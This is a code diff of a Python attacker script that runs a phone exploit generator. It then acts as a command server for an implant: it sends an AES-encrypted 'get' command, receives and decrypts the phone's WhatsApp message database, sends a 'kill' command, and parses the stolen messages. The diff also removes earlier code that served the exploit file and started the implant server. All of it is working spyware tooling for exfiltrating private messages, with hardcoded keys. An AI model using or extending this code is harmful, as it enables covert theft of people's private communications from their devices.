@@ -1,4 +1,4 @@
-import http.server, socket, sqlite3, json, requests, datetime, os
+import http.server, socket, sqlite3, json, requests, datetime, os, time, subprocess
 from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
 from Crypto.Cipher import AES
 import gen_exploit
@@ -6,17 +6,9 @@ import os
 
 # uses port 12345, ensure later processes use a different port
 # TODO move the desired exploit file into this directory so it will be forwarded to the phone when GET request received
-def listen_for_phone_and_send_exploit_file():
-    server_address = ('', 80)
-    print("Waiting on port 80 for client to connect")
-    s = http.server.HTTPServer(server_address, http.server.SimpleHTTPRequestHandler)
-    s.handle_request()
-    
+
 def prepare_implant():
     pass
-
-def start_implant_server():
-    os.system("python3 implant-server.py")
 
 
 def steal_database():
@@ -24,26 +16,49 @@ def steal_database():
     iv = "5468697320697320616e204956343536"
     obj = AES.new(bytes.fromhex(key), AES.MODE_CBC, bytes.fromhex(iv))
     ciphertext = obj.encrypt(b"get" + b"\x00" * 13)
+    print("The get command has been encrypted")
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     port = 443             
     s.bind(('', port))
     s.listen(1)
-    print("Listening on port 443")
-    count = 0 
-    while count < 1:
-        conn, addr = s.accept()
-        print('Got connection from: ', addr)
-        conn.send(ciphertext)
-        print("Encrypted 'get database' command sent to phone")
-        count += 1
-        conn.close() 
-        print("Connection closed")
-        s.close()
+    print("Listening on port 443 for a connection from the phone")
+    conn, addr = s.accept()
+    print('Got connection from: ', addr)
+    conn.send(ciphertext)
+    print("Encrypted 'get database' command sent to phone")
+    count = 0
+    conn.settimeout(5)
+    with open("msgstore.db.enc", "wb") as db:
+        database = conn.recv(8192)
+        while database:
+            try:
+                if count % 10:
+                    print(count)
+                count +=1 
+                db.write(database)
+                database = conn.recv(8192)
+            except:
+                break
 
+    obj = AES.new(bytes.fromhex(key), AES.MODE_CBC, bytes.fromhex(iv))
+    print("Encrypted database has been received")
+    with open('msgstore.db.enc', 'rb') as db_enc:
+        with open("msgstore.db", 'wb') as db:
+            enc_data = db_enc.read()
+            data = obj.decrypt(enc_data)
+            db.write(data)
+    print("Database has been decrypted")
+    obj = AES.new(bytes.fromhex(key), AES.MODE_CBC, bytes.fromhex(iv))
+    kill_ciphertext =  obj.encrypt(b"kill" + b"\x00" * 12)
+    print("The kill command has been encrypted")
+    conn.send(kill_ciphertext)
+    print("The kill command has been sent to the phone")
+
+    
 # Parses WhatsApp message database and stores the messages in a dictionary
 def decode_whatsapp_messages():
     print("Starting to decode WhatsApp messages from the SQLite3 Database")
-    path_to_msg_database = '../whatsapp-databases/msgstore.db'
+    path_to_msg_database = 'msgstore.db'
     c = connect_to_db(path_to_msg_database)
     c.execute("SELECT * FROM legacy_available_messages_view;")
     messages = c.fetchall()
@@ -67,12 +82,9 @@ def connect_to_db(filepath):
     return c
 
 if __name__ == "__main__":
-    # host = 'localhost'
     gen_exploit.gen_exploit()
-    start_implant_server()
-    listen_for_phone_and_send_exploit_file()
-    # send_implant(host)
-    # steal_database()
-    # decode_whatsapp_messages()
+    steal_database()
+    time.sleep(10)
+    decode_whatsapp_messages()
  
    
